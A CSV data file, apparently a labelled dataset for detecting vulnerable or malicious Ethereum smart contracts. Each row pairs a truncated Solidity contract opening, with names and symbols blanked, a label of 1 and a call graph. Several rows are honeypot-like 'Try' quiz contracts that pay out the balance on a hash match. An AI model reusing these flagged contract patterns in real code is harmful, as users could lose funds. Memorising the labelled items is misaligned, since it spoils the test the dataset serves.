file,contract,code,label,graph
0x7638a5f444eab0281ca1abff2c8029cbb806a566.sol,XOXOCoin,"contract XOXOCoin is ERC20 { using SafeMath for uint256; address owner1 = msg.sender; address owner2; mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; mapping (address => uint256) times; mapping (address => mapping (uint256 => uint256)) dorpnum; mapping (address => mapping (uint256 => uint256)) dorptime; mapping (address => mapping (uint256 => uint256)) freeday; mapping (address => bool) public frozenAccount; mapping (address => bool) public airlist; string public constant name = ; string public constant symbol = ; uint public constant decimals = 8; uint256 _Rate = 10 ** decimals; uint256 public totalSupply = 200000000 * _Rate; uint256 public totalDistributed = 0; uint256 public totalRemaining = totalSupply.sub(totalDistributed); uint256 public value; uint256 public _per = 1; bool public distributionClosed = true; event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); event FrozenFunds(address target, bool frozen); event Distr(address indexed to, uint256 amount); event DistrClosed(bool Closed); modifier onlyOwner() { require(msg.sender == owner1 || msg.sender == owner2); _; }",1,"subgraph cluster_1210_XOXOCoin {
label=""XOXOCoin"";
""1210_Set_per"" [label=""Set_per""];
""1210_getTokens"" [label=""getTokens""];
""1210_transfer"" [label=""transfer""];
""1210_freezeAccount"" [label=""freezeAccount""];
""1210_fallback"" [label=""fallback""];
""1210_closeDistribution"" [label=""closeDistribution""];
""1210_XOXOCoin"" [label=""XOXOCoin""];
""1210_transferFrom"" [label=""transferFrom""];
""1210_lockOf"" [label=""lockOf""];
""1210_freeze"" [label=""freeze""];
""1210_distr"" [label=""distr""];
""1210_nowInSeconds"" [label=""nowInSeconds""];
""1210_allowance"" [label=""allowance""];
""1210_transferOwnership"" [label=""transferOwnership""];
""1210_distribute"" [label=""distribute""];
""1210_approve"" [label=""approve""];
""1210_withdraw"" [label=""withdraw""];
""1210_balanceOf"" [label=""balanceOf""];
""1210_closeDistribution"" -> ""1210_onlyOwner"";
""1210_distribute"" -> ""1210_onlyOwner"";
""1210_transfer"" -> ""1210_lockOf"";
""1210_transferFrom"" -> ""1210_lockOf"";
""1210_transfer"" -> ""1210_onlyPayloadSize"";
""1210_transferOwnership"" -> ""1210_onlyOwner"";
""1210_freeze"" -> ""1210_onlyOwner"";
""1210_withdraw"" -> ""1210_onlyOwner"";
""1210_transferFrom"" -> ""1210_onlyPayloadSize"";
""1210_Set_per"" -> ""1210_onlyOwner"";
""1210_distribute"" -> ""1210_distr"";
""1210_fallback"" -> ""1210_getTokens"";
""1210_freeze"" -> ""1210_freezeAccount"";
}
"
0x33ac37240f71629294de98e0b51f904fda17a366.sol,enigma,contract enigma { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value > 2 ether) { msg.sender.transfer(this.balance); },1,"subgraph cluster_143_enigma {
label=""enigma"";
""143_fallback"" [label=""fallback""];
""143_newQuestioner"" [label=""newQuestioner""];
""143_StopGame"" [label=""StopGame""];
""143_NewQuestion"" [label=""NewQuestion""];
""143_Activate"" [label=""Activate""];
""143_Try"" [label=""Try""];
}
"
0x39e568276531f17da3c76d54400cfd8300201652.sol,CSC,"contract CSC { mapping (address => uint256) private balances; mapping (address => uint256[2]) private lockedBalances; string public name; uint8 public decimals; string public symbol; uint256 public totalSupply; address public owner; uint256 private icoLockUntil = 1543593540; event Transfer(address indexed _from, address indexed _to, uint256 _value); constructor( uint256 _initialAmount, string _tokenName, uint8 _decimalUnits, string _tokenSymbol, address _owner, address[] _lockedAddress, uint256[] _lockedBalances, uint256[] _lockedTimes ) public { balances[_owner] = _initialAmount; totalSupply = _initialAmount; name = _tokenName; decimals = _decimalUnits; symbol = _tokenSymbol; owner = _owner; for(uint i = 0;i < _lockedAddress.length;i++){ lockedBalances[_lockedAddress[i]][0] = _lockedBalances[i]; lockedBalances[_lockedAddress[i]][1] = _lockedTimes[i]; }",1,"subgraph cluster_373_CSC {
label=""CSC"";
""373_balanceOf"" [label=""balanceOf""];
""373_withdraw"" [label=""withdraw""];
""373_burnFrom"" [label=""burnFrom""];
""373_setIcoLockUntil"" [label=""setIcoLockUntil""];
""373_transfer"" [label=""transfer""];
""373_withdrawTo"" [label=""withdrawTo""];
""373_constructor"" [label=""constructor""];
""373_makeCoin"" [label=""makeCoin""];
}
"
0x70052a651eec65f98925e845820a0aa5749b033d.sol,ATxBuyback,"contract ATxBuyback is Object, ATxBuybackInterface, ServiceAllowance { using SafeMath for uint; struct FeeData { uint feeValue; uint feeDecimals; }",1,"subgraph cluster_1767_ATxBuyback {
label=""ATxBuyback"";
""1767_tokenFallback"" [label=""tokenFallback""];
""1767_withdrawAllEth"" [label=""withdrawAllEth""];
""1767_fallback"" [label=""fallback""];
""1767_getRdFee"" [label=""getRdFee""];
""1767__takeRdFee"" [label=""_takeRdFee""];
""1767_setPrice"" [label=""setPrice""];
""1767_isTransferAllowed"" [label=""isTransferAllowed""];
""1767_setRdFee"" [label=""setRdFee""];
""1767_ATxBuyback"" [label=""ATxBuyback""];
""1767_setRdCollectorAddress"" [label=""setRdCollectorAddress""];
""1767_setActive"" [label=""setActive""];
""1767__validFee"" [label=""_validFee""];
""1767_withdrawAllEth"" -> ""1767_onlyContractOwner"";
""1767_setActive"" -> ""1767_onlyContractOwner"";
""1767_tokenFallback"" -> ""1767__takeRdFee"";
""1767_setPrice"" -> ""1767_onlyContractOwner"";
""1767_isTransferAllowed"" -> ""1767_onlyActive"";
""1767_setRdCollectorAddress"" -> ""1767_onlyContractOwner"";
""1767__takeRdFee"" -> ""1767__validFee"";
""1767_setRdFee"" -> ""1767_onlyContractOwner"";
""1767_setRdFee"" -> ""1767__validFee"";
}
"
0xf051a2f404435d3413337aae24171342fddc8571.sol,FoxicoPool,"contract FoxicoPool is Ownable { using SafeMath for uint256; mapping (address => uint256) public deposited; mapping (address => uint256) public claimed; uint256 public startTime; uint256 public endTime; address public wallet; bool public refundEnabled; event Refunded(address indexed beneficiary, uint256 weiAmount); event AddDeposit(address indexed beneficiary, uint256 value); function setStartTime(uint256 _startTime) public onlyOwner{ startTime = _startTime; }",1,"subgraph cluster_477_FoxicoPool {
label=""FoxicoPool"";
""477_deposit"" [label=""deposit""];
""477_FoxicoPool"" [label=""FoxicoPool""];
""477_setRefundEnabled"" [label=""setRefundEnabled""];
""477_setWallet"" [label=""setWallet""];
""477_refundFunds"" [label=""refundFunds""];
""477_fallback"" [label=""fallback""];
""477_setStartTime"" [label=""setStartTime""];
""477_addFunds"" [label=""addFunds""];
""477_validPurchase"" [label=""validPurchase""];
""477_forwardFunds"" [label=""forwardFunds""];
""477_refundWallet"" [label=""refundWallet""];
""477_setEndTime"" [label=""setEndTime""];
""477_claimRefund"" [label=""claimRefund""];
""477_setWallet"" -> ""477_onlyOwner"";
""477_deposit"" -> ""477_validPurchase"";
""477_setEndTime"" -> ""477_onlyOwner"";
""477_fallback"" -> ""477_deposit"";
""477_claimRefund"" -> ""477_refundFunds"";
""477_forwardFunds"" -> ""477_onlyOwner"";
""477_addFunds"" -> ""477_onlyOwner"";
""477_refundWallet"" -> ""477_refundFunds"";
""477_setStartTime"" -> ""477_onlyOwner"";
""477_setRefundEnabled"" -> ""477_onlyOwner"";
""477_refundWallet"" -> ""477_onlyOwner"";
}
"
0xeed618c15d12c635c3c319aee7bded2e2879aea0.sol,PlayerBook,contract PlayerBook { using NameFilter for string; using SafeMath for uint256; address private _owner; uint256 public registrationFee_ = 10 finney; mapping(uint256 => PlayerBookReceiverInterface) public games_; mapping(address => bytes32) public gameNames_; mapping(address => uint256) public gameIDs_; uint256 public gID_; uint256 public pID_; mapping (address => uint256) public pIDxAddr_; mapping (bytes32 => uint256) public pIDxName_; mapping (uint256 => Player) public plyr_; mapping (uint256 => mapping (bytes32 => bool)) public plyrNames_; mapping (uint256 => mapping (uint256 => bytes32)) public plyrNameList_; struct Player { address addr; bytes32 name; uint256 laff; uint256 names; },1,"subgraph cluster_20_PlayerBookReceiverInterface {
label=""PlayerBookReceiverInterface"";
""20_receivePlayerInfo"" [label=""receivePlayerInfo""];
""20_receivePlayerNameList"" [label=""receivePlayerNameList""];
}
"
0x86e4dc25259ee2191cd8ae40e1865b9f0319646c.sol,CryptoRomeLandDistribution,"contract CryptoRomeLandDistribution is CryptoRomeControl { using SafeMath for uint256; address public newContractAddress; CryptoRomeLandComposableNFT public cryptoRomeLandNFTContract; ImprovementGeneration public improvementGenContract; uint256 public villageInventoryPrice; uint256 public numImprovementsPerVillage; uint256 constant public LOWEST_VILLAGE_INVENTORY_PRICE = 100000000000000000; constructor (address _cryptoRomeLandNFTContractAddress, address _improvementGenContractAddress) public { require (_cryptoRomeLandNFTContractAddress != address(0)); require (_improvementGenContractAddress != address(0)); paused = true; cryptoRomeLandNFTContract = CryptoRomeLandComposableNFT(_cryptoRomeLandNFTContractAddress); improvementGenContract = ImprovementGeneration(_improvementGenContractAddress); villageInventoryPrice = LOWEST_VILLAGE_INVENTORY_PRICE; numImprovementsPerVillage = 3; }",1,"subgraph cluster_3912_CryptoRomeLandDistribution {
label=""CryptoRomeLandDistribution"";
""3912_setNumImprovementsPerVillage"" [label=""setNumImprovementsPerVillage""];
""3912_batchIssueLand"" [label=""batchIssueLand""];
""3912_createLand"" [label=""createLand""];
""3912_batchCreateVillages"" [label=""batchCreateVillages""];
""3912_purchaseFromVillageInventory"" [label=""purchaseFromVillageInventory""];
""3912_setNewAddress"" [label=""setNewAddress""];
""3912_batchIssueVillages"" [label=""batchIssueVillages""];
""3912_computeFee"" [label=""computeFee""];
""3912_setCryptoRomeLandNFTContract"" [label=""setCryptoRomeLandNFTContract""];
""3912_constructor"" [label=""constructor""];
""3912_setVillageInventoryPrice"" [label=""setVillageInventoryPrice""];
""3912_issueVillageWithImprovementsForPromo"" [label=""issueVillageWithImprovementsForPromo""];
""3912_batchTransferTo"" [label=""batchTransferTo""];
""3912__createLandWithImprovements"" [label=""_createLandWithImprovements""];
""3912__createVillageWithImprovements"" [label=""_createVillageWithImprovements""];
""3912_transferTo"" [label=""transferTo""];
""3912_batchCreateLand"" [label=""batchCreateLand""];
""3912__createVillageWithImprovementsFromInv"" [label=""_createVillageWithImprovementsFromInv""];
""3912_issueLand"" [label=""issueLand""];
""3912_setImprovementGenContract"" [label=""setImprovementGenContract""];
""3912_createLand"" -> ""3912__createLandWithImprovements"";
""3912_setNewAddress"" -> ""3912_onlyOwner"";
""3912_purchaseFromVillageInventory"" -> ""3912__createVillageWithImprovementsFromInv"";
""3912_setImprovementGenContract"" -> ""3912_onlyOwner"";
""3912_issueLand"" -> ""3912_onlyOwner"";
""3912_transferTo"" -> ""3912_onlyOwner"";
""3912_batchIssueVillages"" -> ""3912_onlyOwner"";
""3912__createLandWithImprovements"" -> ""3912__createVillageWithImprovements"";
""3912_createLand"" -> ""3912_onlyOwner"";
""3912_batchCreateVillages"" -> ""3912__createVillageWithImprovements"";
""3912_purchaseFromVillageInventory"" -> ""3912_whenNotPaused"";
""3912__createLandWithImprovements"" -> ""3912__createLandWithImprovements"";
""3912_batchCreateVillages"" -> ""3912_onlyOwner"";
""3912_issueLand"" -> ""3912__createLandWithImprovements"";
""3912_setCryptoRomeLandNFTContract"" -> ""3912_onlyOwner"";
""3912_batchIssueLand"" -> ""3912_issueLand"";
""3912_batchTransferTo"" -> ""3912_onlyOwner"";
""3912_purchaseFromVillageInventory"" -> ""3912_computeFee"";
""3912_issueVillageWithImprovementsForPromo"" -> ""3912_onlyOwner"";
""3912_batchIssueLand"" -> ""3912_onlyOwner"";
""3912_setVillageInventoryPrice"" -> ""3912_onlyOwner"";
""3912_batchIssueVillages"" -> ""3912__createVillageWithImprovements"";
""3912_batchCreateLand"" -> ""3912_onlyOwner"";
""3912_batchCreateLand"" -> ""3912__createLandWithImprovements"";
""3912_setNumImprovementsPerVillage"" -> ""3912_onlyOwner"";
}
"
0x261ace754fba8af93e1fecdff13640540402940f.sol,Phila_Token,"contract Phila_Token is ERC20Interface, Owned { string public constant symbol = ; string public constant name = ; uint8 public constant decimals = 0; uint private constant _totalSupply = 10000000; address public vaultAddress; bool public fundingEnabled; uint public totalCollected; uint public tokenPrice; mapping(address => uint) balances; constructor() public { balances[this] = _totalSupply; emit Transfer(address(0), this, _totalSupply); }",1,"subgraph cluster_499_Phila_Token {
label=""Phila_Token"";
""499_transfer"" [label=""transfer""];
""499_approve"" [label=""approve""];
""499_constructor"" [label=""constructor""];
""499_fallback"" [label=""fallback""];
""499_balanceOf"" [label=""balanceOf""];
""499_transferFrom"" [label=""transferFrom""];
""499_totalSupply"" [label=""totalSupply""];
""499_allowance"" [label=""allowance""];
""499_setVaultAddress"" [label=""setVaultAddress""];
""499_claimTokens"" [label=""claimTokens""];
""499_setFundingEnabled"" [label=""setFundingEnabled""];
""499_updateTokenPrice"" [label=""updateTokenPrice""];
""499_updateTokenPrice"" -> ""499_onlyOwner"";
""499_claimTokens"" -> ""499_onlyOwner"";
""499_setVaultAddress"" -> ""499_onlyOwner"";
""499_setFundingEnabled"" -> ""499_onlyOwner"";
}
"
0xf030b8fbe57c4498298449fc78a0f7054a5ef76d.sol,ArkToken,"contract ArkToken is ERC721, Ownable { using SafeMath for uint256; uint256 private totalTokens; uint256 public developerCut; mapping (uint256 => Animal) public arkData; mapping (uint256 => address) private tokenOwner; mapping (uint256 => uint256) public babies; mapping (uint256 => uint256[2]) public babyMommas; mapping (uint256 => uint256) public mates; mapping (uint256 => uint256) public babyMakinPrice; mapping (uint256 => address) private tokenApprovals; mapping (address => uint256[]) private ownedTokens; mapping(uint256 => uint256) private ownedTokensIndex; mapping (address => uint256) public birtherBalances; event Purchase(uint256 indexed _tokenId, address indexed _buyer, address indexed _seller, uint256 _purchasePrice); event Birth(address indexed _birther, uint256 indexed _mom, uint256 _dad, uint256 indexed _baby); uint256 private firstCap = 0.5 ether; uint256 private secondCap = 1.0 ether; uint256 private thirdCap = 1.5 ether; uint256 private finalCap = 3.0 ether; struct Animal { uint256 price; uint256 lastPrice; address owner; address birther; uint256 birtherPct; uint8 gender; }",1,"subgraph cluster_1673_ArkToken {
label=""ArkToken"";
""1673_createToken"" [label=""createToken""];
""1673_clearApproval"" [label=""clearApproval""];
""1673_transfer"" [label=""transfer""];
""1673_getBabyMommas"" [label=""getBabyMommas""];
""1673_approve"" [label=""approve""];
""1673_checkBalance"" [label=""checkBalance""];
""1673_clearApprovalAndTransfer"" [label=""clearApprovalAndTransfer""];
""1673_buyToken"" [label=""buyToken""];
""1673_isApprovedFor"" [label=""isApprovedFor""];
""1673_transferToken"" [label=""transferToken""];
""1673_removeToken"" [label=""removeToken""];
""1673_tokenExists"" [label=""tokenExists""];
""1673_createBabies"" [label=""createBabies""];
""1673_getArkData"" [label=""getArkData""];
""1673_withdrawBalance"" [label=""withdrawBalance""];
""1673_balanceOf"" [label=""balanceOf""];
""1673_name"" [label=""name""];
""1673_totalSupply"" [label=""totalSupply""];
""1673_checkBirth"" [label=""checkBirth""];
""1673_getNextPrice"" [label=""getNextPrice""];
""1673__mint"" [label=""_mint""];
""1673_createMultiple"" [label=""createMultiple""];
""1673_takeOwnership"" [label=""takeOwnership""];
""1673_getBabyMakinPrice"" [label=""getBabyMakinPrice""];
""1673_approvedFor"" [label=""approvedFor""];
""1673_addToken"" [label=""addToken""];
""1673_createBaby"" [label=""createBaby""];
""1673_withdraw"" [label=""withdraw""];
""1673_getBirthCut"" [label=""getBirthCut""];
""1673_symbol"" [label=""symbol""];
""1673_tokensOf"" [label=""tokensOf""];
""1673_ownerOf"" [label=""ownerOf""];
""1673_autoBirth"" [label=""autoBirth""];
""1673_checkBirth"" -> ""1673_autoBirth"";
""1673_removeToken"" -> ""1673_balanceOf"";
""1673_takeOwnership"" -> ""1673_clearApprovalAndTransfer"";
""1673_createToken"" -> ""1673_onlyAdmin"";
""1673_createMultiple"" -> ""1673_createToken"";
""1673_transferToken"" -> ""1673_addToken"";
""1673_transferToken"" -> ""1673_clearApproval"";
""1673_isApprovedFor"" -> ""1673_approvedFor"";
""1673_createBabies"" -> ""1673_createBaby"";
""1673_approve"" -> ""1673_ownerOf"";
""1673_takeOwnership"" -> ""1673_isApprovedFor"";
""1673_transfer"" -> ""1673_onlyOwnerOf"";
""1673_autoBirth"" -> ""1673_transferToken"";
""1673_addToken"" -> ""1673_balanceOf"";
""1673_buyToken"" -> ""1673_isNotContract"";
""1673_createBaby"" -> ""1673_onlyAdmin"";
""1673_buyToken"" -> ""1673_getNextPrice"";
""1673_transferToken"" -> ""1673_removeToken"";
""1673_clearApprovalAndTransfer"" -> ""1673_ownerOf"";
""1673_createToken"" -> ""1673__mint"";
""1673_approve"" -> ""1673_approvedFor"";
""1673_approve"" -> ""1673_onlyOwnerOf"";
""1673_createMultiple"" -> ""1673_onlyAdmin"";
""1673_createBabies"" -> ""1673_onlyAdmin"";
""1673_removeToken"" -> ""1673_ownerOf"";
""1673_transferToken"" -> ""1673_tokenExists"";
""1673_getArkData"" -> ""1673_getNextPrice"";
""1673_clearApprovalAndTransfer"" -> ""1673_isNotContract"";
""1673_transfer"" -> ""1673_clearApprovalAndTransfer"";
""1673_clearApprovalAndTransfer"" -> ""1673_addToken"";
""1673__mint"" -> ""1673_addToken"";
""1673_buyToken"" -> ""1673_transferToken"";
""1673_withdraw"" -> ""1673_onlyAdmin"";
""1673_clearApproval"" -> ""1673_ownerOf"";
""1673_takeOwnership"" -> ""1673_ownerOf"";
""1673_clearApprovalAndTransfer"" -> ""1673_removeToken"";
""1673_clearApprovalAndTransfer"" -> ""1673_clearApproval"";
""1673_buyToken"" -> ""1673_checkBirth"";
}
"
0xe01ba6c593003b0edcd43b7839a7c36b00a44dfc.sol,SBITokenCrowdsale,"contract SBITokenCrowdsale is Owned, CrowdsaleParameters { using SafeMath for uint256; string public name = ; SBIToken private token; address public bank; address saleWalletAddress; uint private tokenMultiplier = 10; uint public totalCollected = 0; uint public saleStartTimestamp; uint public saleStopTimestamp; uint public saleGoal; bool public goalReached = false; uint public preicoTokensPerEth = 27314; uint public tokensPerEth = 10500; mapping (address => uint256) private investmentRecords; address crowdsaleAddress = this; uint256 public constant saleStartDate = 1530403200; uint256 public constant saleEndDate = 1535759940; uint256 public constant preSaleStartDate = 1529020800; uint256 public constant preSaleEndDate = 1530403140; uint public preSaleAmount = 5800000; event TokenSale(address indexed tokenReceiver, uint indexed etherAmount, uint indexed tokenAmount, uint tokensPerEther); event FundTransfer(address indexed from, address indexed to, uint indexed amount); function SBITokenCrowdsale(address _tokenAddress, address _bankAddress) public { token = SBIToken(_tokenAddress); bank = _bankAddress; tokenMultiplier = tokenMultiplier ** token.decimals(); saleWalletAddress = generalSaleWallet.addr; saleGoal = generalSaleWallet.amount; }",1,"subgraph cluster_1145_SBITokenCrowdsale {
label=""SBITokenCrowdsale"";
""1145_processPayment"" [label=""processPayment""];
""1145_SBITokenCrowdsale"" [label=""SBITokenCrowdsale""];
""1145_isICOActive"" [label=""isICOActive""];
""1145_fallback"" [label=""fallback""];
""1145_setTokenRate"" [label=""setTokenRate""];
""1145_safeWithdrawal"" [label=""safeWithdrawal""];
""1145_kill"" [label=""kill""];
""1145_processPayment"" -> ""1145_isICOActive"";
""1145_kill"" -> ""1145_onlyOwner"";
""1145_fallback"" -> ""1145_processPayment"";
""1145_safeWithdrawal"" -> ""1145_onlyOwner"";
""1145_kill"" -> ""1145_isICOActive"";
""1145_setTokenRate"" -> ""1145_onlyOwner"";
}
"
0xed616b87b2b441e4a36d23f27a660ea0f0faccbd.sol,Destructible,contract Destructible is Ownable { function Destructible() payable { },1,"subgraph cluster_234_Destructible {
label=""Destructible"";
""234_destroy"" [label=""destroy""];
""234_destroyAndSend"" [label=""destroyAndSend""];
""234_Destructible"" [label=""Destructible""];
""234_destroy"" -> ""234_onlyOwner"";
""234_destroyAndSend"" -> ""234_onlyOwner"";
}
"
0x4145492ad5039b802bd7e58098c8d71706a2cd14.sol,RefundVault,"contract RefundVault is Ownable { using SafeMath for uint256; enum State { Active, Refunding, Closed }",1,"subgraph cluster_470_RefundVault {
label=""RefundVault"";
""470_deposit"" [label=""deposit""];
""470_RefundVault"" [label=""RefundVault""];
""470_refund"" [label=""refund""];
""470_enableRefunds"" [label=""enableRefunds""];
""470_close"" [label=""close""];
""470_enableRefunds"" -> ""470_onlyOwner"";
""470_deposit"" -> ""470_onlyOwner"";
""470_close"" -> ""470_onlyOwner"";
}
"
0x4c1ef44b89fdadaea76a6a8004a1b7a5b6a7f603.sol,Destructible,contract Destructible is Ownable { function Destructible() public payable { },1,"subgraph cluster_183_Destructible {
label=""Destructible"";
""183_Destructible"" [label=""Destructible""];
""183_destroy"" [label=""destroy""];
""183_destroyAndSend"" [label=""destroyAndSend""];
""183_destroyAndSend"" -> ""183_onlyOwner"";
""183_destroy"" -> ""183_onlyOwner"";
}
"
0x929e488770ae5218cf4bb5387a390bd36b2135dd.sol,QUIZ_QUIZ,contract QUIZ_QUIZ { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value > 0.4 ether) { msg.sender.transfer(this.balance); },1,"subgraph cluster_148_QUIZ_QUIZ {
label=""QUIZ_QUIZ"";
""148_Stop"" [label=""Stop""];
""148_Try"" [label=""Try""];
""148_New"" [label=""New""];
""148_constructor"" [label=""constructor""];
""148_Start"" [label=""Start""];
""148_fallback"" [label=""fallback""];
""148_New"" -> ""148_isAdmin"";
""148_Start"" -> ""148_isAdmin"";
""148_Stop"" -> ""148_isAdmin"";
}
"
0x36ed5fbd27abf98f7081f1692ce48abab37db172.sol,Quiz_BliZ,contract Quiz_BliZ { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value > 0.4 ether) { msg.sender.transfer(this.balance); },1,"subgraph cluster_148_Quiz_BliZ {
label=""Quiz_BliZ"";
""148_fallback"" [label=""fallback""];
""148_constructor"" [label=""constructor""];
""148_New"" [label=""New""];
""148_Stop"" [label=""Stop""];
""148_Try"" [label=""Try""];
""148_Start"" [label=""Start""];
""148_Stop"" -> ""148_isAdmin"";
""148_New"" -> ""148_isAdmin"";
""148_Start"" -> ""148_isAdmin"";
}
"
0xf099c6ecb16575393b3ba6ac57b4ead943353a52.sol,BuddhaTower,"contract BuddhaTower { event onBuy ( address indexed buyerAddress, uint256 amount, uint256 currentHeight ); event onSplit( uint round, uint luckyNumber, address luckyPlayer ); event onTimeup( uint round, address lastBuyer ); event onQualifySuccess( address applier ); struct RoundData { uint256 maxHeight; uint256 lotteryPool; uint256 peakPool; uint256 tokenPot; uint[][] buyinfo; address[] buyAddress; uint256 startTime; uint256 endTime; address[] lotteryWinners; address finalWinner; }",1,"subgraph cluster_1969_BuddhaTower {
label=""BuddhaTower"";
""1969_wipeAll"" [label=""wipeAll""];
""1969_emergencyStart"" [label=""emergencyStart""];
""1969_splitLottery"" [label=""splitLottery""];
""1969_getQualified"" [label=""getQualified""];
""1969_constructor"" [label=""constructor""];
""1969_getLotteryWinner"" [label=""getLotteryWinner""];
""1969_endTime"" [label=""endTime""];
""1969_emergencyClose"" [label=""emergencyClose""];
""1969_activate"" [label=""activate""];
""1969_getLotteryWinnerLength"" [label=""getLotteryWinnerLength""];
""1969_getBuyInfoLength"" [label=""getBuyInfoLength""];
""1969_takeDevCut"" [label=""takeDevCut""];
""1969_buy"" [label=""buy""];
""1969_moveFromBanlist"" [label=""moveFromBanlist""];
""1969_getBuyAddress"" [label=""getBuyAddress""];
""1969_deposit"" [label=""deposit""];
""1969_getBuyInfo"" [label=""getBuyInfo""];
""1969_withdrawEth"" [label=""withdrawEth""];
""1969_addToBanlist"" [label=""addToBanlist""];
""1969_emergencyClose"" -> ""1969_onlyOwner"";
""1969_wipeAll"" -> ""1969_onlyOwner"";
""1969_withdrawEth"" -> ""1969_isBaned"";
""1969_deposit"" -> ""1969_buy"";
""1969_moveFromBanlist"" -> ""1969_onlyOwner"";
""1969_buy"" -> ""1969_endTime"";
""1969_deposit"" -> ""1969_isHuman"";
""1969_deposit"" -> ""1969_isBaned"";
""1969_emergencyStart"" -> ""1969_onlyOwner"";
""1969_deposit"" -> ""1969_isActive"";
""1969_withdrawEth"" -> ""1969_isHuman"";
""1969_constructor"" -> ""1969_activate"";
""1969_deposit"" -> ""1969_isWithinLimits"";
""1969_addToBanlist"" -> ""1969_onlyOwner"";
""1969_buy"" -> ""1969_splitLottery"";
""1969_activate"" -> ""1969_onlyOwner"";
""1969_takeDevCut"" -> ""1969_onlyOwner"";
}
"
0x7562eacac20093065c37ec6111baae15f152958c.sol,AICrypto,"contract AICrypto is StandardToken, Ownable { string public constant name = ; string public constant symbol = ; uint8 public constant decimals = 4; uint256 public constant INITIAL_SUPPLY = 10000000000 * (10 ** uint256(decimals)); mapping(address => bool) touched; function AICrypto() public { totalSupply_ = INITIAL_SUPPLY; balances[msg.sender] = INITIAL_SUPPLY; emit Transfer(0x0, msg.sender, INITIAL_SUPPLY); }",1,"subgraph cluster_706_AICrypto {
label=""AICrypto"";
""706_AICrypto"" [label=""AICrypto""];
""706_safeWithdrawal"" [label=""safeWithdrawal""];
""706__transfer"" [label=""_transfer""];
""706_safeWithdrawal"" -> ""706_onlyOwner"";
}
"
0xd871a7ce9bcf9cfbefbca3ede0ce53ba1787dfc9.sol,try_to_play,contract try_to_play { function Try(string _response) external payable { require(msg.sender == tx.origin); if(responseHash == keccak256(_response) && msg.value > 2 ether) { msg.sender.transfer(this.balance); },1,"subgraph cluster_143_try_to_play {
label=""try_to_play"";
""143_NewQuestion"" [label=""NewQuestion""];
""143_fallback"" [label=""fallback""];
""143_StopGame"" [label=""StopGame""];
""143_newQuestioner"" [label=""newQuestioner""];
""143_Try"" [label=""Try""];
""143_ActivateContract"" [label=""ActivateContract""];
}
"
0x708a64eba17df26cd7085c494b725160ba1a6b7d.sol,RefundEscrow,"contract RefundEscrow is Ownable, ConditionalEscrow { enum State {Active, Refunding, Closed}",1,"subgraph cluster_2226_RefundEscrow {
label=""RefundEscrow"";
""2226_beneficiaryWithdraw"" [label=""beneficiaryWithdraw""];
""2226_withdrawalAllowed"" [label=""withdrawalAllowed""];
""2226_close"" [label=""close""];
""2226_deposit"" [label=""deposit""];
""2226_constructor"" [label=""constructor""];
""2226_enableRefunds"" [label=""enableRefunds""];
""2226_enableRefunds"" -> ""2226_onlyOwner"";
""2226_deposit"" -> ""2226_deposit"";
""2226_close"" -> ""2226_onlyOwner"";
}
"
0x6f5c1ed62a4fa41cfc332d81fafd3cd38aacbd85.sol,Vault,"contract Vault is TokenVault { event Deposit(address indexed depositor, uint amount); event Withdrawal(address indexed to, uint amount); event OpenDate(uint date); mapping (address => uint) public Deposits; uint minDeposit; bool Locked; uint Date; function initVault() payable open { Owner = msg.sender; minDeposit = 0.25 ether; Locked = false; deposit(); }",1,"subgraph cluster_115_TokenVault {
label=""TokenVault"";
""115_withdrawToken"" [label=""withdrawToken""];
""115_emtpyTo"" [label=""emtpyTo""];
""115_withdrawTokenTo"" [label=""withdrawTokenTo""];
""115_withdrawTokenTo"" -> ""115_onlyOwner"";
""115_emtpyTo"" -> ""115_withdrawTokenTo"";
""115_withdrawToken"" -> ""115_withdrawTokenTo"";
}
"
